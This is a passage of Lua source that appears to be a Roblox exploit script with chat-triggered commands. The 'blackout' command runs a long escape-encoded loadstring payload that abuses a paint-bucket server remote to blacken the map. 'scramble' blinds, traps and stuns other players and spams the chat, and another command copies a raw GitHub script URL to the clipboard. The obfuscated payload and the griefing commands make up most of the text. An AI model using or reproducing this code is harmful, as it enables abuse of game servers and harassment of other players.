            rconsoleprint("-\n")
            rconsoleprint("@@LIGHT_GRAY@@")
            rconsoleprint("Scroll all the way to the top for information")
        end
        if msg:lower() == prefix .. "lockapi" then
            setclipboard("https://raw.githubusercontent.com/M4lw4reT3sts/my-own-scripts-projects/main/Lock%20API%20Main.lua")
            logn("Check your clipboard.")
        end
        if msg:lower() == prefix .. "blackout" then
            cht("time -");wait()
            cht("time 0")
            cht("gear me "..csp.."94333296")
            loadstring(
                "local\32function\32b\40b\41ChatBar\58SetTextFromInput\40b\41game\46Players\58Chat\40b\41ChatBar\46Text\61\34\34end\59colorAPI\61\123\125colorAPI\46color\61function\40b\44c\41local\32b\61coroutine\46create\40function\40\41local\32b\61\123\91\34Part\34\93\61b\44\91\34Color\34\93\61c\125game\58GetService\40\34Workspace\34\41\91game\58GetService\40\34Players\34\41\46LocalPlayer\46Name\93\46PaintBucket\58WaitForChild\40\34Remotes\34\41\46ServerControls\58InvokeServer\40\34PaintPart\34\44b\41end\41coroutine\46resume\40b\41end\59colorAPI\46transformToColor\51\61function\40b\41local\32c\61b\46r\59local\32d\61b\46g\59local\32b\61b\46b\59return\32Color\51\46new\40c\44d\44b\41end\59colorAPI\46colorObbyBox\61function\40b\41for\32c\44c\32in\32pairs\40game\46Workspace\46Terrain\91\34\95Game\34\93\46Workspace\91\34Obby\32Box\34\93\58GetChildren\40\41\41do\32colorAPI\46color\40c\44b\41end\32end\59colorAPI\46colorObbyBricks\61function\40b\41for\32c\44c\32in\32pairs\40game\46Workspace\46Terrain\91\34\95Game\34\93\46Workspace\91\34Obby\34\93\58GetChildren\40\41\41do\32colorAPI\46color\40c\44b\41end\32end\59colorAPI\46colorAdminDivs\61function\40b\41for\32c\44c\32in\32pairs\40game\46Workspace\46Terrain\91\34\95Game\34\93\46Workspace\91\34Admin\32Dividers\34\93\58GetChildren\40\41\41do\32colorAPI\46color\40c\44b\41end\32end\59colorAPI\46colorPads\61function\40b\41for\32c\44c\32in\32pairs\40game\46Workspace\46Terrain\91\34\95Game\34\93\46Admin\91\34Pads\34\93\58GetChildren\40\41\41do\32colorAPI\46color\40c\46Head\44b\41end\32end\59colorAPI\46colorHouse\61function\40b\41local\32c\61b\46wallsC\59local\32d\61b\46baseC\59local\32e\61b\46roofC\59local\32f\61b\46WANDDC\59local\32g\61b\46stairsC\59local\32h\61b\46floorC\59local\32i\61b\46rooftsC\59local\32b\61b\46chiC\59for\32j\44j\32in\32pairs\40game\46Workspace\46Terrain\91\34\95Game\34\93\46Workspace\91\34Basic\32House\34\93\58GetChildren\40\41\41do\32coroutine\46wrap\40function\40\41if\32j\46Name\61\61\34SmoothBlockModel\49\48\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\56\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\49\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\51\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\53\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\55\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\56\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\57\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\48\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\49\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\51\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\56\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\51\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\52\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\54\34or\32j\46Name\61\61\34SmoothBlockModel\50\54\34or\32j\46Name\61\61\34SmoothBlockModel\50\57\34or\32j\46Name\61\61\34SmoothBlockModel\51\48\34or\32j\46Name\61\61\34SmoothBlockModel\51\49\34or\32j\46Name\61\61\34SmoothBlockModel\51\54\34or\32j\46Name\61\61\34SmoothBlockModel\51\55\34or\32j\46Name\61\61\34SmoothBlockModel\51\56\34or\32j\46Name\61\61\34SmoothBlockModel\51\57\34or\32j\46Name\61\61\34SmoothBlockModel\52\49\34or\32j\46Name\61\61\34SmoothBlockModel\52\56\34or\32j\46Name\61\61\34SmoothBlockModel\52\57\34or\32j\46Name\61\61\34SmoothBlockModel\53\49\34or\32j\46Name\61\61\34SmoothBlockModel\53\54\34or\32j\46Name\61\61\34SmoothBlockModel\54\55\34or\32j\46Name\61\61\34SmoothBlockModel\54\56\34or\32j\46Name\61\61\34SmoothBlockModel\54\57\34or\32j\46Name\61\61\34SmoothBlockModel\55\48\34or\32j\46Name\61\61\34SmoothBlockModel\55\50\34or\32j\46Name\61\61\34SmoothBlockModel\55\53\34or\32j\46Name\61\61\34SmoothBlockModel\56\34or\32j\46Name\61\61\34SmoothBlockModel\56\49\34or\32j\46Name\61\61\34SmoothBlockModel\56\53\34or\32j\46Name\61\61\34SmoothBlockModel\57\51\34or\32j\46Name\61\61\34SmoothBlockModel\57\56\34then\32colorAPI\46color\40j\44c\41end\59if\32j\46Name\61\61\34SmoothBlockModel\52\48\34then\32colorAPI\46color\40j\44d\41end\59if\32j\46Name\61\61\34SmoothBlockModel\49\48\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\51\34or\32j\46Name\61\61\34SmoothBlockModel\50\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\48\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\50\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\52\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\53\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\54\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\57\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\48\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\49\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\50\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\53\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\55\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\57\34or\32j\46Name\61\61\34SmoothBlockModel\50\51\34or\32j\46Name\61\61\34SmoothBlockModel\50\51\48\34or\32j\46Name\61\61\34SmoothBlockModel\50\51\49\34or\32j\46Name\61\61\34SmoothBlockModel\50\53\34or\32j\46Name\61\61\34SmoothBlockModel\50\56\34or\32j\46Name\61\61\34SmoothBlockModel\51\50\34or\32j\46Name\61\61\34SmoothBlockModel\51\51\34or\32j\46Name\61\61\34SmoothBlockModel\51\52\34or\32j\46Name\61\61\34SmoothBlockModel\52\50\34or\32j\46Name\61\61\34SmoothBlockModel\52\52\34or\32j\46Name\61\61\34SmoothBlockModel\52\55\34or\32j\46Name\61\61\34SmoothBlockModel\53\52\34or\32j\46Name\61\61\34SmoothBlockModel\53\53\34or\32j\46Name\61\61\34SmoothBlockModel\53\56\34or\32j\46Name\61\61\34SmoothBlockModel\53\57\34or\32j\46Name\61\61\34SmoothBlockModel\54\34or\32j\46Name\61\61\34SmoothBlockModel\54\49\34or\32j\46Name\61\61\34SmoothBlockModel\54\50\34or\32j\46Name\61\61\34SmoothBlockModel\54\51\34or\32j\46Name\61\61\34SmoothBlockModel\55\52\34or\32j\46Name\61\61\34SmoothBlockModel\55\54\34or\32j\46Name\61\61\34SmoothBlockModel\55\55\34or\32j\46Name\61\61\34SmoothBlockModel\55\56\34or\32j\46Name\61\61\34SmoothBlockModel\55\57\34or\32j\46Name\61\61\34SmoothBlockModel\56\48\34or\32j\46Name\61\61\34SmoothBlockModel\56\52\34or\32j\46Name\61\61\34SmoothBlockModel\56\54\34or\32j\46Name\61\61\34SmoothBlockModel\56\55\34or\32j\46Name\61\61\34SmoothBlockModel\56\56\34or\32j\46Name\61\61\34SmoothBlockModel\57\48\34or\32j\46Name\61\61\34SmoothBlockModel\57\49\34or\32j\46Name\61\61\34SmoothBlockModel\57\50\34or\32j\46Name\61\61\34SmoothBlockModel\57\52\34or\32j\46Name\61\61\34SmoothBlockModel\57\53\34or\32j\46Name\61\61\34SmoothBlockModel\57\54\34then\32colorAPI\46color\40j\44e\41end\59if\32j\46Name\61\61\34SmoothBlockModel\49\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\57\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\52\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\54\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\50\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\55\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\56\34or\32j\46Name\61\61\34SmoothBlockModel\50\52\34or\32j\46Name\61\61\34SmoothBlockModel\50\55\34or\32j\46Name\61\61\34SmoothBlockModel\51\53\34or\32j\46Name\61\61\34SmoothBlockModel\52\34or\32j\46Name\61\61\34SmoothBlockModel\52\51\34or\32j\46Name\61\61\34SmoothBlockModel\52\53\34or\32j\46Name\61\61\34SmoothBlockModel\52\54\34or\32j\46Name\61\61\34SmoothBlockModel\53\48\34or\32j\46Name\61\61\34SmoothBlockModel\53\51\34or\32j\46Name\61\61\34SmoothBlockModel\53\55\34or\32j\46Name\61\61\34SmoothBlockModel\54\48\34or\32j\46Name\61\61\34SmoothBlockModel\54\52\34or\32j\46Name\61\61\34SmoothBlockModel\54\53\34or\32j\46Name\61\61\34SmoothBlockModel\54\54\34or\32j\46Name\61\61\34SmoothBlockModel\55\34or\32j\46Name\61\61\34SmoothBlockModel\55\49\34or\32j\46Name\61\61\34SmoothBlockModel\55\51\34or\32j\46Name\61\61\34SmoothBlockModel\56\50\34or\32j\46Name\61\61\34SmoothBlockModel\56\51\34or\32j\46Name\61\61\34SmoothBlockModel\56\57\34or\32j\46Name\61\61\34SmoothBlockModel\57\57\34then\32colorAPI\46color\40j\44f\41end\59if\32j\46Name\61\61\34SmoothBlockModel\49\34or\32j\46Name\61\61\34SmoothBlockModel\51\34or\32j\46Name\61\61\34SmoothBlockModel\53\34or\32j\46Name\61\61\34SmoothBlockModel\57\34then\32colorAPI\46color\40j\44g\41end\59if\32j\46Name\61\61\34SmoothBlockModel\49\49\50\34then\32colorAPI\46color\40j\44h\41end\59if\32j\46Name\61\61\34SmoothBlockModel\53\50\34or\32j\46Name\61\61\34SmoothBlockModel\57\55\34then\32colorAPI\46color\40j\44i\41end\59if\32j\46Name\61\61\34SmoothBlockModel\49\54\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\56\34then\32colorAPI\46color\40j\44b\41end\32end\41\40\41end\32end\59colorAPI\46colorBuildingBricks\61function\40b\41local\32c\61b\46DarkStoneGrey\59local\32d\61b\46DeepBlue\59local\32e\61b\46NY\59local\32f\61b\46IW\59local\32g\61b\46LimeGreen\59local\32h\61b\46MSG\59local\32i\61b\46RB\59local\32j\61b\46RR\59local\32b\61b\46TP\59for\32k\44k\32in\32pairs\40game\46Workspace\46Terrain\91\34\95Game\34\93\46Workspace\91\34Building\32Bricks\34\93\58GetChildren\40\41\41do\32coroutine\46wrap\40function\40\41if\32k\46Name\61\61\34Part\50\57\34or\32k\46Name\61\61\34Part\51\49\34or\32k\46Name\61\61\34Part\53\53\34then\32colorAPI\46color\40k\44c\41end\59if\32k\46Name\61\61\34Part\49\49\34or\32k\46Name\61\61\34Part\49\56\34or\32k\46Name\61\61\34Part\50\53\34or\32k\46Name\61\61\34Part\51\34or\32k\46Name\61\61\34Part\52\51\34then\32colorAPI\46color\40k\44d\41end\59if\32k\46Name\61\61\34Part\49\50\34or\32k\46Name\61\61\34Part\49\53\34or\32k\46Name\61\61\34Part\50\52\34or\32k\46Name\61\61\34Part\52\52\34or\32k\46Name\61\61\34Part\54\34then\32colorAPI\46color\40k\44e\41end\59if\32k\46Name\61\61\34Part\49\51\34or\32k\46Name\61\61\34Part\50\49\34or\32k\46Name\61\61\34Part\50\51\34or\32k\46Name\61\61\34Part\55\34then\32colorAPI\46color\40k\44f\41end\59if\32k\46Name\61\61\34Part\49\55\34or\32k\46Name\61\61\34Part\50\54\34or\32k\46Name\61\61\34Part\51\56\34or\32k\46Name\61\61\34Part\57\34or\32k\46Name\61\61\34Part\53\34then\32colorAPI\46color\40k\44g\41end\59if\32k\46Name\61\61\34Part\51\48\34or\32k\46Name\61\61\34Part\51\50\34or\32k\46Name\61\61\34Part\51\51\34or\32k\46Name\61\61\34Part\51\52\34or\32k\46Name\61\61\34Part\51\53\34or\32k\46Name\61\61\34Part\51\54\34or\32k\46Name\61\61\34Part\51\57\34or\32k\46Name\61\61\34Part\52\48\34or\32k\46Name\61\61\34Part\52\49\34or\32k\46Name\61\61\34Part\52\50\34or\32k\46Name\61\61\34Part\52\54\34or\32k\46Name\61\61\34Part\52\55\34or\32k\46Name\61\61\34Part\52\56\34or\32k\46Name\61\61\34Part\52\57\34or\32k\46Name\61\61\34Part\53\48\34or\32k\46Name\61\61\34Part\53\49\34or\32k\46Name\61\61\34Part\53\50\34or\32k\46Name\61\61\34Part\53\51\34or\32k\46Name\61\61\34Part\53\52\34or\32k\46Name\61\61\34Part\53\54\34or\32k\46Name\61\61\34Part\53\55\34or\32k\46Name\61\61\34Part\53\56\34or\32k\46Name\61\61\34Part\53\57\34or\32k\46Name\61\61\34Part\54\48\34or\32k\46Name\61\61\34Part\54\49\34then\32colorAPI\46color\40k\44h\41end\59if\32k\46Name\61\61\34Part\49\52\34or\32k\46Name\61\61\34Part\49\57\34or\32k\46Name\61\61\34Part\50\34or\32k\46Name\61\61\34Part\50\55\34then\32colorAPI\46color\40k\44i\41end\59if\32k\46Name\61\61\34Part\49\34or\32k\46Name\61\61\34Part\49\48\34or\32k\46Name\61\61\34Part\49\54\34or\32k\46Name\61\61\34Part\50\50\34or\32k\46Name\61\61\34Part\51\55\34then\32colorAPI\46color\40k\44j\41end\59if\32k\46Name\61\61\34Part\50\48\34or\32k\46Name\61\61\34Part\50\56\34or\32k\46Name\61\61\34Part\52\34or\32k\46Name\61\61\34Part\52\53\34or\32k\46Name\61\61\34Part\56\34then\32colorAPI\46color\40k\44b\41end\32end\41\40\41end\32end\59b\40\34gear\32me\32\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\49\56\52\55\52\52\53\57\34\41wait\40\49\41game\46Players\46LocalPlayer\46Character\46Humanoid\58EquipTool\40game\46Players\46LocalPlayer\46Backpack\46PaintBucket\41wait\40\48\46\53\48\41coroutine\46wrap\40function\40\41colorAPI\46colorHouse\40\123wallsC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44baseC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44roofC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44WANDDC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44stairsC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44floorC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44rooftsC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44chiC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\125\41end\41\40\41spawn\40function\40\41colorAPI\46colorBuildingBricks\40\123DarkStoneGrey\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44DeepBlue\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44NY\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44IW\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44LimeGreen\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44MSG\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44RB\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44TP\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44RR\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\125\41end\41colorAPI\46color\40game\46Workspace\46Terrain\91\34\95Game\34\93\46Workspace\91\34Baseplate\34\93\44colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\41spawn\40function\40\41colorAPI\46colorObbyBox\40colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\41end\41spawn\40function\40\41colorAPI\46colorObbyBricks\40colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\41end\41spawn\40function\40\41colorAPI\46colorAdminDivs\40colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\41end\41spawn\40function\40\41colorAPI\46colorPads\40colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\41end\41wait\40\48\46\54\41b\40\34ungear\32\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\32me\32\34\46\46math\46random\40\57\57\57\57\57\41\41\10"
            )()
        end
        if msg:lower() == prefix .. "removewater" then
            cht(prefix.."infyield");wait(.65)
            cht("/super gear me "..csp.."000000000000000000000000000088146497");wait(1.65)
            execCmd("noclipcam")
            execCmd("usetools 50 0.033")
            setclipboard("usetools 50 0.033")
        end

        if msg:lower() == prefix .. "scramble" then
            cht("blind all")
            cht("music 6823378863")
            cht(prefix.."temploopgrab")
            cht("/trap others");wait()
            cht("stun others");wait(.5)
            cht("noclip others")
            cht(
                [[h  

























_______________________________________


__________________________
__________________________

Scrambling the signals

__________________________

Please wait

_________________________________
__________________________

]]
            );wait()
            say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
            say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
            say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻");wait(5)
            cht(prefix.."untemploopgrab")
            cht("clr");wait()
            say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
